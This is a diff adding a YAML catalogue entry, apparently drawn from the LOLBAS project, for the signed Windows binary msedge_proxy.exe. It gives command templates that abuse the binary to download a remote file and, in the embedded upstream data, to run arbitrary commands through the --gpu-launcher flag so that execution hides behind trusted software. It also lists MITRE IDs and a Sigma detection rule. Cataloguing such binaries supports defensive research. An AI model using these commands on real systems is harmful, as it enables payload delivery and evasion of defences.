@@ -1,0 +1,95 @@
+id: lolbas/T1NCaW5hcmllcy9tc2VkZ2VfcHJveHkueW1s/RG93bmxvYWQ/0
+type: binary
+platform: windows
+name: msedge_proxy.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+aliases:
+- msedge_proxy
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_susp_electron_execution_proxy.yml
+commands:
+- template: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip}
+  comment: msedge_proxy will download malicious file.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: msedge_proxy.exe
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OSBinaries/msedge_proxy.yml
+      command_source_index: 0
+      document_utf8: "---\nName: msedge_proxy.exe\nFull_Path:\n  - Path: C:\\Program Files (x86)\\Microsoft\\\
+        Edge\\Application\\msedge_proxy.exe\nDescription: Microsoft Edge Browser\nAuthor: 'Mert Daş'\n\
+        Created: 2023-08-18\nCommands:\n  - Command: \"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\
+        \\Application\\\\msedge_proxy.exe {REMOTEURL:.zip}\"\n    Description: msedge_proxy will download\
+        \ malicious file.\n    Usecase: Download file from the internet\n    Category: Download\n    Privileges:\
+        \ User\n    MitreID: T1105\n    OperatingSystem: Windows 10, Windows 11\n  - Command: \"C:\\\\\
+        Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge_proxy.exe --disable-gpu-sandbox\
+        \ --gpu-launcher=\\\"{CMD} &&\\\"\"\n    Description: msedge_proxy.exe will execute file in the\
+        \ background\n    Usecase: Executes a process under a trusted Microsoft signed binary\n    Category:\
+        \ Execute\n    Privileges: User\n    MitreID: T1218.015\n    OperatingSystem: Windows 10, Windows\
+        \ 11\n    Tags:\n      - Execute: CMD\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_susp_electron_execution_proxy.yml\n\
+        Acknowledgement:\n  - Person: Mert Daş\n    Handle: '@merterpreter'\n"
+      document_sha256: sha256:30bb47c5eb241fe17446ce91aca58ece8816d7e810b84e186cde32a9bc260d26
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:22a0271de857c0acff85a69569d1fe4581482731506c8da637e6cda6cdcb2862
